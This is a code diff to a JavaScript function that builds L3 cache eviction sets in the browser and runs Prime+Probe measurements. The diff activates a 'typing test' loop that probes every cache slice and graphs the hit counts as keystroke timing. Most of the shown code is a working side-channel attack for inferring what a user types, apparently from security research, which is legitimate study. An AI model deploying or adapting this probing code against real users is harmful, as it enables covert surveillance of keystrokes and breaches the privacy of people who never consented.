@@ -622,8 +622,7 @@ async function l3pp_main(options){
     while(num_sets < NUM_SLICES){
         let victim = victims[victim_index]
         let already_found = false;
-        for(let set of found_sets){
-            let evset = new EvictionListL3(buffer, set)
+        for(let evset of found_sets){
             if(evset.evict_reload(victim, 100)){
                 already_found = true;
             } 
@@ -636,82 +635,85 @@ async function l3pp_main(options){
                 victim: VICTIM,
                 candidate_set: candidate_set
             });
-            found_sets.push(Array.from(set[0]))
+            found_sets.push(new EvictionListL3(buffer, Array.from(set[0])))
             num_sets++;
         }
 
         victim_index++;
     }
-    log(found_sets)
-    for(let i = 0; i < 4; i++){
-        let evset = new EvictionListL3(buffer, found_sets[i]);
-        evset.probe()
-    }
+    
+    /* local transmission test */
+    let evset = found_sets[0];
 
-       
-    /* ignore slicing keystroke timing */
-    // let set = await build_evset({
-    //     offset: options.offset ?? 63,
-    //     module: module,
-    //     memory: memory,
-    //     victim: options.victim 
-    // });
-    let evset = new EvictionListL3(buffer, found_sets[0]);
-
-
-    let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
+    const TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
     ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
     log("detection-rate: " + ipdft_out[0]);
     log("false-positive-rate: " + ipdft_out[1]);
 
     /* compute detection rate */
-    let TRANSMIT_ROUNDS_SIDE = 256
+    const TRANSMIT_ROUNDS_SIDE = 256
     intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
-    // //
-    // cross_core_test(evset, 128); 
-    //
-    // log("typing test begins now")
-    // let start_measurement = Math.floor(performance.now());
-    // log("start: "+start_measurement)
-    // const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
-    // let traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE);
-    // traces.fill(0);
-    //
-    // let num_traces = 0;
-    //
-    // for(let i = 0; i < 20; i++){
-    //     evset.probe();
-    // }
-    // while(num_traces < KEYSTROKE_BUFFER_SIZE){
-    //     for(let i = 0; i < 8; i++){
-    //         let result = evset.probe();
-    //         traces[num_traces] += (result << i); 
-    //     }
-    //     num_traces++;
-    // }
-    //
-    // let end_measurement = Math.floor(performance.now());
-    // log("end: " + end_measurement)
-    // let duration = end_measurement - start_measurement;
-    // log("duration: " + duration)
-    //
-    // let NUM_MEASUREMENTS_MS = 1024;
-    // let hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS);
-    // hit_count_per_ms.fill(0);
-    //
-    // for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
-    //     for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
-    //         let data = traces[i * NUM_MEASUREMENTS_MS / 8 + j];
-    //         for(let k = 0; k < 8; k++){
-    //             let result = data & 1;
-    //             hit_count_per_ms[i] += result;
-    //             result >>= 1;
-    //         }
-    //     }
-    // }
-    //
-    // await graphKeystrokes(hit_count_per_ms);
-    //
+    
+    /* typing test begins */
+    log("typing test begins now")
+
+    // log start measurement 
+    let start_measurement = Math.floor(performance.now());
+    log("start: "+start_measurement)
+
+    const KEYSTROKE_BUFFER_SIZE = 256 * 1024;
+    const NUM_MEASUREMENTS_MS = 2048 / NUM_SLICES;
+
+    let hit_count_per_ms = [] 
+
+    // initialize the traces array
+    let traces = []
+    for(let i = 0; i < NUM_SLICES; i++){
+        traces.push(new Uint8Array(KEYSTROKE_BUFFER_SIZE));
+        traces[i].fill(0)
+        hit_count_per_ms.push(new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS));
+        hit_count_per_ms[i].fill(0);
+    }
+
+    let num_traces = 0;
+    
+    /* warm up all sets for the test */
+    for(let i = 0; i < 10; i++){
+        for(let j = 0; j < NUM_SLICES; j++){
+            found_sets[j].probe()
+        }
+    } 
+
+    while(num_traces < KEYSTROKE_BUFFER_SIZE){
+        for(let i = 0; i < 8; i++){
+            for(let j = 0; j < NUM_SLICES; j++){
+                let result = found_sets[j].probe();
+                traces[j][num_traces] += (result << i); 
+            }
+        }
+        num_traces++;
+    }
+
+    let end_measurement = Math.floor(performance.now());
+    log("end: " + end_measurement)
+    let duration = end_measurement - start_measurement;
+    log("duration: " + duration)
+
+    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
+        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
+            for(let k = 0; k < NUM_SLICES; k++){
+                let data = traces[k][i * NUM_MEASUREMENTS_MS / 8 + j];
+                for(let l = 0; l < 8; l++){
+                    let result = data & 1;
+                    hit_count_per_ms[k][i] += result;
+                    data >>= 1;
+                }
+            }
+        }
+    }
+
+    await graphKeystrokes({"data": hit_count_per_ms, "pp_duration": hit_count_per_ms[0].length, "js_duration": duration, "start_time": start_measurement});
+
     // remote_set_profiling(evset);
     await stopTimer();
 }
